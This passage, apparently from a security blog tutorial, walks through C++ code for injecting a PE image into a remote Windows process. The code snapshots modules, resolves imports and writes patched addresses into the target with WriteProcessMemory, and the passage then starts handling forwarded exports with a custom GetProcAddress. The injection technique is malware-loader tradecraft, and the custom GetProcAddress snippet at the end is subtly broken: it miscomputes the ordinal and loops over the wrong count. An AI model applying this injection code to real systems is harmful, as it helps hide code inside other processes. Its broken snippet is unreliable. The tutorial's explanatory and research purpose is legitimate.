    <span class="n">MODULEENTRY32W</span> <span class="n">me32</span><span class="p">;</span>

    <span class="n">mod</span> <span class="o">=</span> <span class="n">CreateToolhelp32Snapshot</span><span class="p">(</span><span class="n">TH32CS_SNAPMODULE</span> <span class="o">|</span> <span class="n">TH32CS_SNAPMODULE32</span><span class="p">,</span> <span class="n">pid</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">mod</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">_err</span><span class="p">(</span><span class="s">"ERROR in creating SnapShot: %x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">me32</span><span class="p">.</span><span class="n">dwSize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">MODULEENTRY32W</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">Module32FirstW</span><span class="p">(</span><span class="n">mod</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">me32</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">_err</span><span class="p">(</span><span class="s">"No Module Found %x"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="n">CloseHandle</span><span class="p">(</span><span class="n">mod</span><span class="p">);</span>
        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">_dbg</span><span class="p">(</span><span class="s">"Loaded Modules:</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">_dbg</span><span class="p">(</span><span class="s">"name</span><span class="se">\t\t\t</span><span class="s"> base address</span><span class="se">\t\t\t</span><span class="s">size</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">_dbg</span><span class="p">(</span><span class="s">"=================================================================================</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="k">do</span> <span class="p">{</span>
        <span class="n">_dbg</span><span class="p">(</span><span class="s">"%#25ws</span><span class="se">\t\t</span><span class="s">%#10llx</span><span class="se">\t\t</span><span class="s">%#10d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">me32</span><span class="p">.</span><span class="n">szModule</span><span class="p">,</span> <span class="n">me32</span><span class="p">.</span><span class="n">modBaseAddr</span><span class="p">,</span> <span class="n">me32</span><span class="p">.</span><span class="n">modBaseSize</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">Module32NextW</span><span class="p">(</span><span class="n">mod</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">me32</span><span class="p">));</span>
    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">mod</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure>

<p><img src="assets/img/posts/20240124/libAddr.png" alt="Get DLL addresses" /></p>

<p>We can observe that we can retrieve the correct addresses for the loaded libraries.<br />
Let’s create a function to create a snapshot of our remote process and another function to retrieve a module from its name and from a <code class="language-plaintext highlighter-rouge">HANDLE</code> of the remote process snapshot.</p>

<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="n">HANDLE</span> <span class="nf">getSnapShotProcess</span><span class="p">(</span><span class="kt">int</span> <span class="n">pid</span><span class="p">)</span> <span class="p">{</span>

    <span class="n">HANDLE</span> <span class="n">mod</span><span class="p">;</span>    
    <span class="n">mod</span> <span class="o">=</span> <span class="n">CreateToolhelp32Snapshot</span><span class="p">(</span><span class="n">TH32CS_SNAPMODULE</span> <span class="o">|</span> <span class="n">TH32CS_SNAPMODULE32</span><span class="p">,</span> <span class="n">pid</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">mod</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">_err</span><span class="p">(</span><span class="s">"CreateToolhelp32Snapshot error %x</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="k">return</span> <span class="nb">nullptr</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="n">mod</span><span class="p">;</span>

<span class="p">}</span>

<span class="n">MODULEENTRY32W</span> <span class="nf">getModuleEntry</span><span class="p">(</span><span class="n">HANDLE</span> <span class="n">snapShotHandle</span><span class="p">,</span> <span class="n">PWSTR</span> <span class="n">moduleSearched</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">MODULEENTRY32W</span> <span class="n">me32</span><span class="p">;</span>
    <span class="n">me32</span><span class="p">.</span><span class="n">dwSize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">MODULEENTRY32W</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">Module32FirstW</span><span class="p">(</span><span class="n">snapShotHandle</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">me32</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">return</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
    <span class="p">}</span>
    <span class="k">do</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">lstrcmpiW</span><span class="p">(</span><span class="n">me32</span><span class="p">.</span><span class="n">szModule</span><span class="p">,</span> <span class="n">moduleSearched</span><span class="p">))</span>
        <span class="p">{</span>
            <span class="k">return</span> <span class="n">me32</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">Module32NextW</span><span class="p">(</span><span class="n">snapShotHandle</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">me32</span><span class="p">));</span>
    <span class="k">return</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
<span class="p">}</span></code></pre></figure>

<p>Like we would have done in a reflective loader, from the import descriptors retrieved previously, we will import locally the libraries needed by our injected PE. It will be used to retrieve the offset of our functions. Then we will iterate over all the <code class="language-plaintext highlighter-rouge">thunks</code> of the import descriptors. These thunks are data structures describing functions corresponding to the library imports.<br />
The <code class="language-plaintext highlighter-rouge">thunks</code> can reference the corresponding function by its ordinal or by its name. Therefore, it is needed to apply the macro <code class="language-plaintext highlighter-rouge">IMAGE_SNAP_BY_ORDINAL</code> used to determine if the <code class="language-plaintext highlighter-rouge">thunk</code> reference the function through its ordinal or its name <code class="language-plaintext highlighter-rouge">IMAGE_SNAP_BY_ORDINAL(thunk-&gt;u1.Ordinal)</code>. <br />
If the function is referenced by ordinal, we can resolve the function by calling <code class="language-plaintext highlighter-rouge">GetProcAddress</code> to resolve the function address.
If the function is referenced by its name, we need to calculate the pointer to the name: <code class="language-plaintext highlighter-rouge">PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)pImage + thunk-&gt;u1.AddressOfData - offsetRdata);</code>. Then, we can call the function <code class="language-plaintext highlighter-rouge">GetProcAddress</code> to resolve the function address.
Once we have the function address, we can calculate its offset in the corresponding library to be able to calculate its address in the remote process.<br />
Now we need to find the thunk location on the remote process to write our patched address. We need to:</p>
<ul>
  <li>retrieve the address of the function address to patch <code class="language-plaintext highlighter-rouge">&amp;(thunk-&gt;u1.Function)</code></li>
  <li>apply the <code class="language-plaintext highlighter-rouge">.rdata</code> offset on the address previously retrieved <code class="language-plaintext highlighter-rouge">(PBYTE)(&amp;(thunkFct-&gt;u1.Function)) + offsetRdata</code></li>
  <li>substract the address of DLL locally loaded: <code class="language-plaintext highlighter-rouge">(PBYTE)(&amp;(thunk-&gt;u1.Function)) + offsetRdata - (PBYTE)pImage</code></li>
  <li>finally add the address of memory allocation on the remote process: <code class="language-plaintext highlighter-rouge">(PBYTE)(&amp;(thunk-&gt;u1.Function)) + offsetRdata - (PBYTE)pImage + (PBYTE)allocAddrOnTarget</code></li>
</ul>

<p>Now we have everything, we can just call the function <code class="language-plaintext highlighter-rouge">WriteProcessMemory</code> to patch the function address.</p>

<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="kt">bool</span> <span class="nf">fixImports</span><span class="p">(</span><span class="n">LPVOID</span> <span class="n">pImage</span><span class="p">,</span> <span class="n">PIMAGE_NT_HEADERS64</span> <span class="n">ntHeaders</span><span class="p">,</span> <span class="n">LPPROCESS_INFORMATION</span> <span class="n">pi</span><span class="p">,</span> <span class="n">PVOID</span> <span class="n">allocAddrOnTarget</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">offsetRdata</span><span class="p">,</span> <span class="n">HANDLE</span> <span class="n">mod</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">_dbg</span><span class="p">(</span><span class="s">"[*] Fixing Import table</span><span class="se">\r\n</span><span class="s">"</span><span class="p">);</span>

    <span class="n">PIMAGE_IMPORT_DESCRIPTOR</span> <span class="n">importDescriptor</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">IMAGE_DATA_DIRECTORY</span> <span class="n">importsDirectory</span> <span class="o">=</span> <span class="n">ntHeaders</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">DataDirectory</span><span class="p">[</span><span class="n">IMAGE_DIRECTORY_ENTRY_IMPORT</span><span class="p">];</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">importsDirectory</span><span class="p">.</span><span class="n">Size</span> <span class="o">&lt;=</span> <span class="mi">20</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">_dbg</span><span class="p">(</span><span class="s">"[*] Empty IAT"</span><span class="p">);</span>
        <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">HMODULE</span> <span class="n">lib</span> <span class="o">=</span> <span class="nb">nullptr</span><span class="p">;</span>

    
    <span class="n">importDescriptor</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_IMPORT_DESCRIPTOR</span><span class="p">)(</span><span class="n">importsDirectory</span><span class="p">.</span><span class="n">VirtualAddress</span> <span class="o">-</span> <span class="n">offsetRdata</span> <span class="o">+</span> <span class="p">(</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pImage</span><span class="p">);</span>
    

    <span class="k">while</span> <span class="p">(</span><span class="n">importDescriptor</span><span class="o">-&gt;</span><span class="n">Name</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">PWSTR</span> <span class="n">moduleSearched</span> <span class="o">=</span> <span class="n">strToWstr</span><span class="p">((</span><span class="n">LPSTR</span><span class="p">)(</span><span class="n">importDescriptor</span><span class="o">-&gt;</span><span class="n">Name</span> <span class="o">-</span> <span class="n">offsetRdata</span> <span class="o">+</span> <span class="p">(</span><span class="n">DWORD_PTR</span><span class="p">)</span><span class="n">pImage</span><span class="p">));</span>
        <span class="n">lib</span> <span class="o">=</span> <span class="n">LoadLibraryW</span><span class="p">(</span><span class="n">moduleSearched</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">lib</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">_err</span><span class="p">(</span><span class="s">"Error in retrieving locally the lib %ws -&gt; 0x%x</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">moduleSearched</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
            <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">MODULEENTRY32W</span> <span class="n">me32</span> <span class="o">=</span> <span class="n">getModuleEntry</span><span class="p">(</span><span class="n">mod</span><span class="p">,</span> <span class="n">moduleSearched</span><span class="p">);</span>
        <span class="n">_dbg</span><span class="p">(</span><span class="s">"Import found %ws -&gt; %ws @ 0x%p </span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">moduleSearched</span><span class="p">,</span> <span class="n">me32</span><span class="p">.</span><span class="n">szModule</span><span class="p">,</span> <span class="n">me32</span><span class="p">.</span><span class="n">modBaseAddr</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">me32</span><span class="p">.</span><span class="n">modBaseAddr</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">PIMAGE_THUNK_DATA</span> <span class="n">thunk</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
            <span class="n">thunk</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_THUNK_DATA</span><span class="p">)((</span><span class="n">DWORD_PTR</span><span class="p">)</span><span class="n">pImage</span> <span class="o">+</span> <span class="n">importDescriptor</span><span class="o">-&gt;</span><span class="n">FirstThunk</span> <span class="o">-</span> <span class="n">offsetRdata</span><span class="p">);</span>

            <span class="k">while</span> <span class="p">(</span><span class="n">thunk</span><span class="o">-&gt;</span><span class="n">u1</span><span class="p">.</span><span class="n">AddressOfData</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">IMAGE_SNAP_BY_ORDINAL</span><span class="p">(</span><span class="n">thunk</span><span class="o">-&gt;</span><span class="n">u1</span><span class="p">.</span><span class="n">Ordinal</span><span class="p">))</span>
                <span class="p">{</span>
                    <span class="n">LPCSTR</span> <span class="n">functionOrdinal</span> <span class="o">=</span> <span class="p">(</span><span class="n">LPCSTR</span><span class="p">)</span><span class="n">IMAGE_ORDINAL</span><span class="p">(</span><span class="n">thunk</span><span class="o">-&gt;</span><span class="n">u1</span><span class="p">.</span><span class="n">Ordinal</span><span class="p">);</span>

                    <span class="n">PVOID</span> <span class="n">remoteAddr</span> <span class="o">=</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">thunk</span><span class="o">-&gt;</span><span class="n">u1</span><span class="p">.</span><span class="n">Function</span><span class="p">)</span> <span class="o">+</span> <span class="n">offsetRdata</span> <span class="o">-</span> <span class="p">(</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pImage</span> <span class="o">+</span> <span class="p">(</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">allocAddrOnTarget</span><span class="p">);</span>
                    <span class="n">PVOID</span> <span class="n">localAddr</span> <span class="o">=</span> <span class="p">(</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">lib</span><span class="p">,</span> <span class="n">functionOrdinal</span><span class="p">);</span>
                    <span class="n">DWORD</span> <span class="n">offset</span> <span class="o">=</span> <span class="p">(</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">localAddr</span> <span class="o">-</span> <span class="p">(</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">lib</span><span class="p">;</span>
                    <span class="n">ULONGLONG</span> <span class="n">addrFix</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">me32</span><span class="p">.</span><span class="n">modBaseAddr</span> <span class="o">+</span> <span class="n">offset</span><span class="p">);</span>

                    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">pi</span><span class="o">-&gt;</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">remoteAddr</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">addrFix</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">))</span>
                    <span class="p">{</span>
                        <span class="n">_err</span><span class="p">(</span><span class="s">"Error in fixing address of function number %d -&gt; 0x%x</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">thunk</span><span class="o">-&gt;</span><span class="n">u1</span><span class="p">.</span><span class="n">Ordinal</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
                        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="n">_dbg</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">[*] Imported function number %d @ 0x%p</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">thunk</span><span class="o">-&gt;</span><span class="n">u1</span><span class="p">.</span><span class="n">Ordinal</span><span class="p">,</span> <span class="n">addrFix</span><span class="p">);</span>

                <span class="p">}</span>
                <span class="k">else</span>
                <span class="p">{</span>
                    <span class="n">PIMAGE_IMPORT_BY_NAME</span> <span class="n">functionName</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_IMPORT_BY_NAME</span><span class="p">)((</span><span class="n">DWORD_PTR</span><span class="p">)</span><span class="n">pImage</span> <span class="o">+</span> <span class="n">thunk</span><span class="o">-&gt;</span><span class="n">u1</span><span class="p">.</span><span class="n">AddressOfData</span> <span class="o">-</span> <span class="n">offsetRdata</span><span class="p">);</span>
                    <span class="n">PVOID</span> <span class="n">remoteAddr</span> <span class="o">=</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)(</span><span class="o">&amp;</span><span class="p">(</span><span class="n">thunk</span><span class="o">-&gt;</span><span class="n">u1</span><span class="p">.</span><span class="n">Function</span><span class="p">))</span> <span class="o">+</span> <span class="n">offsetRdata</span> <span class="o">-</span> <span class="p">(</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pImage</span> <span class="o">+</span> <span class="p">(</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">allocAddrOnTarget</span><span class="p">);</span>

                    <span class="n">PVOID</span> <span class="n">addrFunc</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">lib</span><span class="p">,</span> <span class="n">functionName</span><span class="o">-&gt;</span><span class="n">Name</span><span class="p">);</span>
                    <span class="n">DWORD</span> <span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
                    <span class="n">PVOID</span> <span class="n">addrFix</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
                    <span class="n">offset</span> <span class="o">=</span> <span class="p">(</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">addrFunc</span> <span class="o">-</span> <span class="p">(</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">lib</span><span class="p">;</span>
                    <span class="n">addrFix</span> <span class="o">=</span> <span class="p">((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">me32</span><span class="p">.</span><span class="n">modBaseAddr</span> <span class="o">+</span> <span class="n">offset</span><span class="p">);</span>
                
                    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">pi</span><span class="o">-&gt;</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">remoteAddr</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">addrFix</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PVOID</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">))</span>
                    <span class="p">{</span>
                        <span class="n">_err</span><span class="p">(</span><span class="s">"Error in fixing address of function %s -&gt; 0x%x</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">functionName</span><span class="o">-&gt;</span><span class="n">Name</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
                        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
                    <span class="p">}</span>


                    <span class="n">_dbg</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">[*] Imported function %s @ 0x%p</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">functionName</span><span class="o">-&gt;</span><span class="n">Name</span><span class="p">,</span> <span class="n">addrFix</span><span class="p">);</span>

                <span class="p">}</span>
                <span class="n">thunk</span><span class="o">++</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="n">importDescriptor</span><span class="o">++</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure>

<p>Now let’s wrap up everything and test if it is working. 
<img src="assets/img/posts/20240124/AccessViolation.png" alt="Access Violation on execution" /></p>

<p>If we put a debugger on our remote process, we can observe that when we resume the main thread, the process crashes with an access violation. If we look at the address where the access violation occurs, we can observe that it is related to the function <code class="language-plaintext highlighter-rouge">LsaConnectUntrusted</code> from the library <code class="language-plaintext highlighter-rouge">Secur32.dll</code>.<br />
Let’s find out what happened.<br />
Let’s write a little C code to perform <code class="language-plaintext highlighter-rouge">D/Invoke</code> on the function <code class="language-plaintext highlighter-rouge">LsaConnectUntrusted</code>.
<img src="assets/img/posts/20240124/loadLib.png" alt="D/Invoke on LsaConnectUntrusted" />
We can observe that despite using a <code class="language-plaintext highlighter-rouge">HANDLE</code> on <code class="language-plaintext highlighter-rouge">Secur32.dll</code>, the address of <code class="language-plaintext highlighter-rouge">LsaConnectUntrusted</code> is located in the library <code class="language-plaintext highlighter-rouge">sspicli.dll</code>.<br />
It is what we call a <code class="language-plaintext highlighter-rouge">Forwarded Function</code>. It is an exported function of <code class="language-plaintext highlighter-rouge">Secur32.dll</code> but which is forwarded to the library <code class="language-plaintext highlighter-rouge">sspicli.dll</code>.</p>

<h2 id="handle-forwarded-functions-on-remote-process">Handle forwarded functions on remote process</h2>

<h3 id="definition-of-a-forwarded-function">Definition of a forwarded function</h3>

<p>First let’s define what is a forwarded function.<br />
In the context of dynamic-link libraries (DLLs), a forwarded function refers to a function that is not directly implemented within the DLL itself but is instead provided by another DLL. When a program calls a forwarded function in a DLL, the control is transferred to the corresponding function in another DLL.<br />
The forwarding information is typically stored in the export table of the DLL. The export table contains a list of functions that the DLL makes available to other programs, and for forwarded functions, it includes a reference to the DLL and the specific function to which the call should be forwarded.</p>

<p>Here is a simplified example to illustrate how a forwarded function might be set up:</p>
<ul>
  <li>Original DLL (A.dll):
    <ul>
      <li>Implements some functions.</li>
      <li>Has an export table that includes information about the functions it exports.</li>
    </ul>
  </li>
  <li>Forwarded DLL (B.dll):
    <ul>
      <li>Implements the forwarded function(s).</li>
      <li>When A.dll exports a function that is forwarded to B.dll, the export table of A.dll contains information about the forwarding, specifying that the function is provided by B.dll.</li>
    </ul>
  </li>
  <li>Client Program:
    <ul>
      <li>Calls a function from A.dll, including the forwarded function.</li>
      <li>When the forwarded function is called, control is transferred to B.dll, where the actual implementation resides.</li>
    </ul>
  </li>
</ul>

<h3 id="custom-getprocaddress">Custom GetProcAddress</h3>

<p>To be able to determine if a function is a forwarded function, we need to implement a custom <code class="language-plaintext highlighter-rouge">GetProcAddress</code> function which will return the forwarded library name and the forwarded function name if we are in the context of a forwarded function.</p>

<p><code class="language-plaintext highlighter-rouge">GetProcAddress</code> function parses the loaded library passed in argument. First the function needs to retrieve the export directory of the library.</p>

<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="n">PVOID</span> <span class="nf">getAddrFunction</span><span class="p">(</span><span class="n">HMODULE</span> <span class="n">lib</span><span class="p">,</span> <span class="n">PCHAR</span> <span class="n">functionName</span><span class="p">,</span> <span class="n">PCHAR</span><span class="o">&amp;</span> <span class="n">forwardedLib</span><span class="p">,</span> <span class="n">PCHAR</span><span class="o">&amp;</span> <span class="n">forwardedName</span><span class="p">)</span>
<span class="p">{</span>
    <span class="c1">// Get DOS Header
</span>
    <span class="n">PIMAGE_DOS_HEADER</span> <span class="n">dosHeader</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_DOS_HEADER</span><span class="p">)</span><span class="n">lib</span><span class="p">;</span>
    <span class="c1">// Get Nt Header
</span>
    <span class="n">PIMAGE_NT_HEADERS</span> <span class="n">imageNTHeaders</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_NT_HEADERS</span><span class="p">)((</span><span class="n">DWORD_PTR</span><span class="p">)</span><span class="n">lib</span> <span class="o">+</span> <span class="n">dosHeader</span><span class="o">-&gt;</span><span class="n">e_lfanew</span><span class="p">);</span>
    <span class="c1">//Get offset of export directory
</span>
    <span class="n">DWORD_PTR</span> <span class="n">exportDirectoryRVA</span> <span class="o">=</span> <span class="n">imageNTHeaders</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">DataDirectory</span><span class="p">[</span><span class="n">IMAGE_DIRECTORY_ENTRY_EXPORT</span><span class="p">].</span><span class="n">VirtualAddress</span><span class="p">;</span>
    <span class="c1">// Get export directory size
</span>
    <span class="n">SIZE_T</span> <span class="n">exportDirectorySize</span> <span class="o">=</span> <span class="n">imageNTHeaders</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">DataDirectory</span><span class="p">[</span><span class="n">IMAGE_DIRECTORY_ENTRY_EXPORT</span><span class="p">].</span><span class="n">Size</span><span class="p">;</span>
    
    <span class="c1">// Retrieve the export directory
</span>
    <span class="n">PIMAGE_EXPORT_DIRECTORY</span> <span class="n">imageExportDirectory</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_EXPORT_DIRECTORY</span><span class="p">)((</span><span class="n">DWORD_PTR</span><span class="p">)</span><span class="n">lib</span> <span class="o">+</span> <span class="n">exportDirectoryRVA</span><span class="p">);</span>
<span class="p">}</span></code></pre></figure>

<p>Once we have the export directory, we will retrieve 3 arrays:</p>
<ul>
  <li>an array containing the addresses of the exported functions</li>
  <li>an array containing the ordinal of the exported functions</li>
  <li>an array containing the names of the exported funtions</li>
</ul>

<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="c1">// Get array containing the addresses of the exported functions
</span>
<span class="n">PDWORD</span> <span class="n">addressOfFunctionsRVA</span> <span class="o">=</span> <span class="p">(</span><span class="n">PDWORD</span><span class="p">)((</span><span class="n">DWORD_PTR</span><span class="p">)</span><span class="n">lib</span> <span class="o">+</span> <span class="n">imageExportDirectory</span><span class="o">-&gt;</span><span class="n">AddressOfFunctions</span><span class="p">);</span>

<span class="c1">// Get array containing the names of the exported funtions
</span>
<span class="n">PDWORD</span> <span class="n">addressOfNamesRVA</span> <span class="o">=</span> <span class="p">(</span><span class="n">PDWORD</span><span class="p">)((</span><span class="n">DWORD_PTR</span><span class="p">)</span><span class="n">lib</span> <span class="o">+</span> <span class="n">imageExportDirectory</span><span class="o">-&gt;</span><span class="n">AddressOfNames</span><span class="p">);</span>

<span class="c1">// Get array containing the ordial of the exported functions
</span>
<span class="n">PWORD</span> <span class="n">addressOfNameOrdinalsRVA</span> <span class="o">=</span> <span class="p">(</span><span class="n">PWORD</span><span class="p">)((</span><span class="n">DWORD_PTR</span><span class="p">)</span><span class="n">lib</span> <span class="o">+</span> <span class="n">imageExportDirectory</span><span class="o">-&gt;</span><span class="n">AddressOfNameOrdinals</span><span class="p">);</span></code></pre></figure>

<p>We now can iterate over the exported functions to retrieve the wanted function. Caution, the index of the function address is not the same as the index of its name. We need to use the ordinal as index.</p>

<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="k">for</span> <span class="p">(</span><span class="n">DWORD</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">imageExportDirectory</span><span class="o">-&gt;</span><span class="n">NumberOfFunctions</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
<span class="p">{</span>
    <span class="c1">// Retrieve the function name
</span>
    <span class="n">PSTR</span> <span class="n">name</span> <span class="o">=</span> <span class="p">(</span><span class="n">PSTR</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">lib</span><span class="o">+</span> <span class="n">addressOfNamesRVA</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
    <span class="c1">// Retrieve the ordinal of the function
</span>
    <span class="n">WORD</span> <span class="n">ordinalName</span> <span class="o">=</span> <span class="p">(</span><span class="n">WORD</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">lib</span> <span class="o">+</span> <span class="n">addressOfNameOrdinalsRVA</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
    <span class="c1">// Retrieve the function address
</span>
    <span class="n">PVOID</span> <span class="n">addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">lib</span> <span class="o">+</span> <span class="n">addressOfFunctionsRVA</span><span class="p">[</span><span class="n">ordinalName</span><span class="p">]);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">functionName</span><span class="p">,</span> <span class="n">name</span><span class="p">))</span>
    <span class="p">{</span>
        <span class="k">return</span> <span class="n">addr</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span></code></pre></figure>

<p>Now that we have re-implemented <code class="language-plaintext highlighter-rouge">GetProcAddress</code>, we need our function to resolve the function when it is a forwarded one. To determine if the function is a forwarded function or not, we will observe if the function address is in the memory space of the export directory.</p>

